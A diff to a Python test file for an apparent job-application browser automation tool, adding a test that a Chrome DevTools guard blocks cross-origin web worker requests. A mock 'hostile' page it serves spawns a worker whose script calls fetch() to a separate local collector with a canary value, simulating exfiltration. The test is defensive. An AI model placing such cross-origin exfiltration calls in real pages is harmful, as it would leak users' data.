@@ -103,6 +103,49 @@ class _HostileEmployerHandler(BaseHTTPRequestHandler):
         return
 
 
+class _WorkerEmitterHandler(BaseHTTPRequestHandler):
+    collector_origin = ""
+    page_requests = 0
+    worker_script_requests = 0
+
+    def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
+        if self.path == "/worker.js":
+            type(self).worker_script_requests += 1
+            body = (
+                "fetch("
+                + json.dumps(f"{type(self).collector_origin}/collect?value=worker-canary")
+                + ", {mode: 'no-cors'}).catch(() => {});"
+            ).encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/javascript")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        type(self).page_requests += 1
+        body = b"""<!doctype html><script>new Worker('/worker.js');</script>"""
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, _format: str, *_args: object) -> None:
+        return
+
+
+class _WorkerCollectorHandler(BaseHTTPRequestHandler):
+    requests: list[str] = []
+
+    def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
+        type(self).requests.append(self.path)
+        self.send_response(204)
+        self.end_headers()
+
+    def log_message(self, _format: str, *_args: object) -> None:
+        return
+
+
 @pytest.mark.system_browser
 def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkeypatch):
     """Exercise the real system-browser guard only when explicitly requested.
@@ -145,6 +188,7 @@ def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkey
             port=dry_port,
             headless=True,
             dry_run=True,
+            approved_application_url=f"http://127.0.0.1:{server.server_port}/",
         )
         try:
             _wait_for_page_target(dry_port)
@@ -182,6 +226,7 @@ def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkey
             port=live_port,
             headless=True,
             dry_run=False,
+            approved_application_url=f"http://127.0.0.1:{server.server_port}/",
         )
         try:
             _navigate_and_read_blocked_flag(
@@ -208,6 +253,75 @@ def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkey
     finally:
         server.shutdown()
         server.server_close()
+
+
+@pytest.mark.system_browser
+def test_live_origin_guard_blocks_cross_origin_worker_request(
+    tmp_path,
+    monkeypatch,
+) -> None:
+    if os.environ.get(_SYSTEM_BROWSER_SMOKE_ENV) != "1":
+        pytest.skip(
+            "system-browser smoke is opt-in; "
+            f"set {_SYSTEM_BROWSER_SMOKE_ENV}=1 to run it"
+        )
+
+    chrome.config.get_chrome_path()
+    collector = ThreadingHTTPServer(("127.0.0.1", 0), _WorkerCollectorHandler)
+    emitter = ThreadingHTTPServer(("127.0.0.1", 0), _WorkerEmitterHandler)
+    collector_thread = threading.Thread(
+        target=collector.serve_forever,
+        daemon=True,
+    )
+    emitter_thread = threading.Thread(target=emitter.serve_forever, daemon=True)
+    collector_thread.start()
+    emitter_thread.start()
+    _WorkerCollectorHandler.requests = []
+    _WorkerEmitterHandler.page_requests = 0
+    _WorkerEmitterHandler.worker_script_requests = 0
+    _WorkerEmitterHandler.collector_origin = f"http://127.0.0.1:{collector.server_port}"
+    approved_url = f"http://127.0.0.1:{emitter.server_port}/"
+
+    def setup_profile(worker_id: int) -> Path:
+        profile = tmp_path / f"profile-{worker_id}"
+        (profile / "Default").mkdir(parents=True, exist_ok=True)
+        return profile
+
+    monkeypatch.setattr(chrome, "setup_worker_profile", setup_profile)
+    monkeypatch.setattr(
+        chrome,
+        "validate_public_http_url",
+        lambda _url: PublicUrlDecision(True),
+    )
+    port = _free_port()
+    process = None
+    try:
+        process = chrome.launch_chrome(
+            worker_id=905,
+            port=port,
+            headless=True,
+            dry_run=False,
+            approved_application_url=approved_url,
+        )
+        _wait_for_page_target(port)
+        _create_page_target(port, approved_url)
+        deadline = time.time() + 5
+        while _WorkerEmitterHandler.page_requests == 0 and time.time() < deadline:
+            time.sleep(0.05)
+        assert _WorkerEmitterHandler.page_requests == 1
+        time.sleep(0.5)
+        assert _WorkerCollectorHandler.requests == []
+        with chrome._public_destination_guards_lock:
+            guard = chrome._public_destination_guards[port]
+        assert "worker_target:TARGET" in guard.evidence()["blocked_channels"]
+        assert guard.evidence()["protected_targets"] >= 1
+    finally:
+        if process is not None:
+            chrome.cleanup_worker(905, process)
+        emitter.shutdown()
+        emitter.server_close()
+        collector.shutdown()
+        collector.server_close()
 
 
 def test_dry_run_request_policy_blocks_all_mutating_methods():
@@ -269,7 +383,10 @@ def test_browser_guard_session_blocks_hostile_dry_run_events_before_resume(monke
             pass
 
     websocket_connection = _FakeWebSocket()
-    guard = chrome._DryRunCdpGuard(port=1)
+    guard = chrome._DryRunCdpGuard(
+        port=1,
+        approved_application_url="https://employer.example/apply",
+    )
     session = chrome._BrowserApplyGuardSession(_FakeWebsocketModule, websocket_connection, guard)
     monkeypatch.setattr(chrome, "validate_public_http_url", lambda _url: PublicUrlDecision(True))
 
@@ -396,7 +513,13 @@ def test_launch_chrome_installs_public_destination_guard_for_live_runs(tmp_path,
         lambda port, **_ownership: calls.append(("dry_run", port)),
     )
 
-    chrome.launch_chrome(worker_id=903, port=9555, headless=True, dry_run=False)
+    chrome.launch_chrome(
+        worker_id=903,
+        port=9555,
+        headless=True,
+        dry_run=False,
+        approved_application_url="https://apply.example.com/job",
+    )
 
     assert calls == [("public", 9555)]
 
@@ -432,11 +555,29 @@ def test_launch_chrome_uses_combined_dry_run_guard_for_dry_runs(tmp_path, monkey
         lambda port, **_ownership: calls.append(("dry_run", port)),
     )
 
-    chrome.launch_chrome(worker_id=904, port=9666, headless=True, dry_run=True)
+    chrome.launch_chrome(
+        worker_id=904,
+        port=9666,
+        headless=True,
+        dry_run=True,
+        approved_application_url="https://apply.example.com/job",
+    )
 
     assert calls == [("dry_run", 9666)]
-    assert chrome._DryRunCdpGuard(port=1).enforce_dry_run is True
-    assert chrome._PublicDestinationCdpGuard(port=1).enforce_dry_run is False
+    assert (
+        chrome._DryRunCdpGuard(
+            port=1,
+            approved_application_url="https://apply.example.com/job",
+        ).enforce_dry_run
+        is True
+    )
+    assert (
+        chrome._PublicDestinationCdpGuard(
+            port=1,
+            approved_application_url="https://apply.example.com/job",
+        ).enforce_dry_run
+        is False
+    )
 
 
 def test_browser_guard_waits_for_initial_fetch_ack_and_pauses_new_pages() -> None:
@@ -509,7 +650,11 @@ def test_browser_guard_waits_for_initial_fetch_ack_and_pauses_new_pages() -> Non
             return None
 
     websocket_connection = _FakeBrowserWebSocket()
-    guard = chrome._PublicDestinationCdpGuard(port=1, capability_checker=lambda: True)
+    guard = chrome._PublicDestinationCdpGuard(
+        port=1,
+        approved_application_url="https://careers.example.com/apply",
+        capability_checker=lambda: True,
+    )
     session = chrome._BrowserApplyGuardSession(
         _FakeWebsocketModule,
         websocket_connection,
@@ -629,7 +774,11 @@ def test_public_destination_cdp_guard_fails_loopback_requests(monkeypatch):
 
     monkeypatch.setattr(websocket, "create_connection", lambda *_args, **_kwargs: _FakeWebSocket())
 
-    guard = chrome._PublicDestinationCdpGuard(port=1, capability_checker=lambda: True)
+    guard = chrome._PublicDestinationCdpGuard(
+        port=1,
+        approved_application_url="https://careers.example.com/apply",
+        capability_checker=lambda: True,
+    )
     chrome._run_apply_page_session("target-1", "ws://example.invalid/devtools/page/1", guard)
 
     assert {
@@ -678,7 +827,11 @@ def test_public_destination_cdp_guard_continues_public_requests(monkeypatch):
     monkeypatch.setattr(websocket, "create_connection", lambda *_args, **_kwargs: _FakeWebSocket())
     monkeypatch.setattr(chrome, "validate_public_http_url", lambda _url: PublicUrlDecision(True))
 
-    guard = chrome._PublicDestinationCdpGuard(port=1, capability_checker=lambda: True)
+    guard = chrome._PublicDestinationCdpGuard(
+        port=1,
+        approved_application_url="https://careers.example.com/apply",
+        capability_checker=lambda: True,
+    )
     chrome._run_apply_page_session("target-2", "ws://example.invalid/devtools/page/2", guard)
 
     assert {
@@ -746,6 +899,7 @@ def test_public_destination_guard_fails_live_http_submit_after_capability_revoca
         chrome._chrome_procs[worker_id] = process
     guard = chrome._PublicDestinationCdpGuard(
         port=8123,
+        approved_application_url="https://careers.example.com/apply",
         capability_checker=lambda: False,
         worker_id=worker_id,
         process=process,
@@ -796,6 +950,7 @@ def test_guard_revocation_preserves_foreign_listener_when_process_is_not_tracked
             chrome._chrome_procs[worker_id] = replaced_process
         guard = chrome._PublicDestinationCdpGuard(
             port=port,
+            approved_application_url="https://careers.example.com/apply",
             capability_checker=lambda: False,
             worker_id=worker_id,
             process=owned_process,
@@ -827,14 +982,20 @@ def test_dry_run_guard_evidence_reports_unprotected_when_guard_is_missing():
 
 
 def test_dry_run_guard_evidence_reports_unprotected_before_any_page_session_attaches():
-    guard = chrome._DryRunCdpGuard(port=1)
+    guard = chrome._DryRunCdpGuard(
+        port=1,
+        approved_application_url="https://employer.example/apply",
+    )
 
     assert guard.evidence()["coverage"] == "unprotected"
     assert guard.evidence()["protected_targets"] == 0
 
 
 def test_dry_run_guard_evidence_records_sanitized_submission_channels():
-    guard = chrome._DryRunCdpGuard(port=1)
+    guard = chrome._DryRunCdpGuard(
+        port=1,
+        approved_application_url="https://employer.example/apply",
+    )
     guard.record_blocked_request(
         channel="network",
         method="DELETE",
